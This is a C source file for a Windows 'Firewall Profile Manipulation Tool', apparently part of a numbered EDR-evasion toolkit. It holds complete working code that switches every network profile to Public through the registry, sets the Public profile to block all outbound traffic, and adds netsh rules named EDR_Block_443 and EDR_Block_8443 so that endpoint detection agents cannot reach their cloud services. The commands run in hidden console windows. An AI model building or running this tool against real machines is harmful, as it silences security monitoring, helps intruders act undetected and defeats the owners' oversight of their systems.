/*
 * 20_firewall_profile.c
 * Firewall Profile Switching — force Public profile to drop EDR-permitted traffic
 *
 * Windows has three firewall profiles: Domain, Private, Public.
 * Many EDR WFP allow-rules are only installed in the Domain profile sublayer.
 * By switching the active profile to "Public" (most restrictive), those rules
 * don't apply and default-deny Public rules may block EDR outbound connections.
 *
 * Additionally, this sets the Public profile to "Block all outbound" for good measure,
 * which blocks EDR connections even if the EDR has a fallback Public profile rule.
 *
 * Two methods:
 *   1. Registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles\
 *                Category REG_DWORD: 0=Public, 1=Private, 2=Domain
 *   2. netsh advfirewall: configure default policies per profile
 *
 * Build:
 *   cl 20_firewall_profile.c /link Advapi32.lib
 *
 * Usage:
 *   20_firewall_profile.exe show              Show current profile for each interface
 *   20_firewall_profile.exe set-public        Set all interfaces to Public profile
 *   20_firewall_profile.exe block-outbound    Set Public profile: block outbound
 *   20_firewall_profile.exe restore           Restore Domain profile + allow outbound
 *   20_firewall_profile.exe block-edr-ports   Block TCP 443 outbound in Public profile
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "Advapi32.lib")

#define NETLIST_KEY \
    L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Profiles"

/* Values for the Category REG_DWORD */
#define NET_CATEGORY_PUBLIC  0
#define NET_CATEGORY_PRIVATE 1
#define NET_CATEGORY_DOMAIN  2

static DWORD RunCmd(const WCHAR *cmd)
{
    WCHAR buf[1024];
    _snwprintf_s(buf, ARRAYSIZE(buf), _TRUNCATE, L"cmd.exe /c %s", cmd);

    STARTUPINFOW si = { sizeof(si) };
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessW(NULL, buf, NULL, NULL, FALSE, CREATE_NO_WINDOW,
                         NULL, NULL, &si, &pi))
        return GetLastError();

    WaitForSingleObject(pi.hProcess, 10000);
    DWORD code = 1;
    GetExitCodeProcess(pi.hProcess, &code);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return code;
}

/* Show current profile categories from registry */
static void ShowProfiles(void)
{
    HKEY hBase = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, NETLIST_KEY, 0, KEY_READ, &hBase)
            != ERROR_SUCCESS)
    {
        wprintf(L"[-] Cannot open NetworkList\\Profiles key\n");
        return;
    }

    wprintf(L"%-40s  %-10s  %s\n", L"Profile GUID", L"Category", L"Name");
    wprintf(L"%-40s  %-10s  %s\n",
            L"------------------------------------",
            L"---------", L"----");

    WCHAR subName[64];
    DWORD subLen = ARRAYSIZE(subName);
    DWORD idx    = 0;

    while (RegEnumKeyExW(hBase, idx, subName, &subLen,
                          NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
    {
        HKEY hSub = NULL;
        if (RegOpenKeyExW(hBase, subName, 0, KEY_READ, &hSub) == ERROR_SUCCESS) {
            DWORD   category = 0xFF;
            DWORD   catSize  = sizeof(category);
            WCHAR   name[128] = {0};
            DWORD   nameLen   = sizeof(name);

            RegQueryValueExW(hSub, L"Category", NULL, NULL,
                             (BYTE *)&category, &catSize);
            RegQueryValueExW(hSub, L"ProfileName", NULL, NULL,
                             (BYTE *)name, &nameLen);

            const WCHAR *catStr = L"Unknown";
            switch (category) {
                case NET_CATEGORY_PUBLIC:  catStr = L"Public";  break;
                case NET_CATEGORY_PRIVATE: catStr = L"Private"; break;
                case NET_CATEGORY_DOMAIN:  catStr = L"Domain";  break;
            }
            wprintf(L"%-40s  %-10s  %s\n", subName, catStr, name);
            RegCloseKey(hSub);
        }
        idx++;
        subLen = ARRAYSIZE(subName);
    }
    RegCloseKey(hBase);
}

/* Set all profiles to Public (category=0) */
static BOOL SetAllProfilesPublic(void)
{
    HKEY hBase = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, NETLIST_KEY, 0,
                       KEY_READ | KEY_WRITE, &hBase) != ERROR_SUCCESS)
    {
        wprintf(L"[-] Cannot open NetworkList\\Profiles key\n");
        return FALSE;
    }

    WCHAR subName[64];
    DWORD subLen = ARRAYSIZE(subName);
    DWORD idx    = 0;
    DWORD count  = 0;

    while (RegEnumKeyExW(hBase, idx, subName, &subLen,
                          NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
    {
        HKEY hSub = NULL;
        if (RegOpenKeyExW(hBase, subName, 0, KEY_WRITE, &hSub) == ERROR_SUCCESS) {
            DWORD cat = NET_CATEGORY_PUBLIC;
            if (RegSetValueExW(hSub, L"Category", 0, REG_DWORD,
                                (BYTE *)&cat, sizeof(cat)) == ERROR_SUCCESS)
            {
                count++;
                wprintf(L"  [+] Set to Public: %s\n", subName);
            }
            RegCloseKey(hSub);
        }
        idx++;
        subLen = ARRAYSIZE(subName);
    }
    RegCloseKey(hBase);

    if (count > 0) {
        wprintf(L"[+] %lu profile(s) set to Public.\n", count);
        wprintf(L"[!] Changes take effect after adapter reconnect or restart.\n");
        return TRUE;
    }
    wprintf(L"[-] No profiles modified.\n");
    return FALSE;
}

/* Restore all profiles to Domain (category=2) */
static BOOL RestoreProfiles(void)
{
    HKEY hBase = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, NETLIST_KEY, 0,
                       KEY_READ | KEY_WRITE, &hBase) != ERROR_SUCCESS)
        return FALSE;

    WCHAR subName[64];
    DWORD subLen = ARRAYSIZE(subName);
    DWORD idx    = 0;
    DWORD count  = 0;

    while (RegEnumKeyExW(hBase, idx, subName, &subLen,
                          NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
    {
        HKEY hSub = NULL;
        if (RegOpenKeyExW(hBase, subName, 0, KEY_WRITE, &hSub) == ERROR_SUCCESS) {
            DWORD cat = NET_CATEGORY_DOMAIN;
            RegSetValueExW(hSub, L"Category", 0, REG_DWORD,
                            (BYTE *)&cat, sizeof(cat));
            count++;
            RegCloseKey(hSub);
        }
        idx++;
        subLen = ARRAYSIZE(subName);
    }
    RegCloseKey(hBase);
    wprintf(L"[+] %lu profile(s) restored to Domain.\n", count);
    return TRUE;
}

/* Set Public profile to block all outbound connections via netsh advfirewall */
static void BlockOutboundPublic(void)
{
    wprintf(L"[*] Setting Public profile default outbound action to Block...\n");
    RunCmd(L"netsh advfirewall set publicprofile firewallpolicy blockinbound,blockoutbound");
    wprintf(L"[+] Public profile: inbound=BLOCK, outbound=BLOCK\n");
    wprintf(L"[!] All outbound traffic from Public-profile interfaces is now blocked.\n");
}

/* Restore Public profile outbound to Allow */
static void RestoreOutboundPublic(void)
{
    RunCmd(L"netsh advfirewall set publicprofile firewallpolicy blockinbound,allowoutbound");
    wprintf(L"[+] Public profile: outbound=ALLOW restored.\n");
}

/*
 * Add a specific block rule in the Public profile for TCP port 443 outbound.
 * More surgical than blocking all outbound.
 */
static void BlockEdrPorts(void)
{
    wprintf(L"[*] Adding outbound block for TCP 443 in Public profile...\n");

    /* Block outbound TCP 443 (HTTPS — EDR cloud) */
    RunCmd(
        L"netsh advfirewall firewall add rule "
        L"name=\"EDR_Block_443\" "
        L"dir=out action=block protocol=TCP remoteport=443 "
        L"profile=public enable=yes"
    );
    wprintf(L"[+] Rule added: 'EDR_Block_443' (TCP out 443, Public profile)\n");

    /* Also block 8443 which some EDRs use as fallback */
    RunCmd(
        L"netsh advfirewall firewall add rule "
        L"name=\"EDR_Block_8443\" "
        L"dir=out action=block protocol=TCP remoteport=8443 "
        L"profile=public enable=yes"
    );
    wprintf(L"[+] Rule added: 'EDR_Block_8443' (TCP out 8443, Public profile)\n");

    wprintf(L"\n[!] These rules only apply when the profile is 'Public'.\n");
    wprintf(L"    Use 'set-public' first to switch the active profile.\n");
}

/* Remove the added block rules */
static void RemoveEdrRules(void)
{
    RunCmd(L"netsh advfirewall firewall delete rule name=\"EDR_Block_443\"");
    RunCmd(L"netsh advfirewall firewall delete rule name=\"EDR_Block_8443\"");
    wprintf(L"[+] EDR block rules removed.\n");
}

int wmain(int argc, wchar_t *argv[])
{
    wprintf(L"[*] Firewall Profile Manipulation Tool\n\n");

    if (argc < 2) {
        wprintf(L"Usage:\n");
        wprintf(L"  %s show              Show network profile categories\n", argv[0]);
        wprintf(L"  %s set-public        Switch all profiles to Public category\n", argv[0]);
        wprintf(L"  %s block-outbound    Set Public profile: block all outbound\n", argv[0]);
        wprintf(L"  %s block-edr-ports   Block TCP 443/8443 in Public profile\n", argv[0]);
        wprintf(L"  %s restore           Restore Domain profiles + allow outbound\n", argv[0]);
        wprintf(L"  %s remove-rules      Remove added firewall block rules\n", argv[0]);
        return 1;
    }

    if (_wcsicmp(argv[1], L"show") == 0) {
        ShowProfiles();
        return 0;
    }
    if (_wcsicmp(argv[1], L"set-public") == 0) {
        SetAllProfilesPublic();
        return 0;
    }
    if (_wcsicmp(argv[1], L"block-outbound") == 0) {
        BlockOutboundPublic();
        return 0;
    }
    if (_wcsicmp(argv[1], L"block-edr-ports") == 0) {
        BlockEdrPorts();
        return 0;
    }
    if (_wcsicmp(argv[1], L"restore") == 0) {
        RestoreProfiles();
        RestoreOutboundPublic();
        RemoveEdrRules();
        wprintf(L"\n[+] Firewall profile fully restored.\n");
        return 0;
    }
    if (_wcsicmp(argv[1], L"remove-rules") == 0) {
        RemoveEdrRules();
        return 0;
    }

    wprintf(L"[-] Unknown command: %s\n", argv[1]);
    return 1;
}
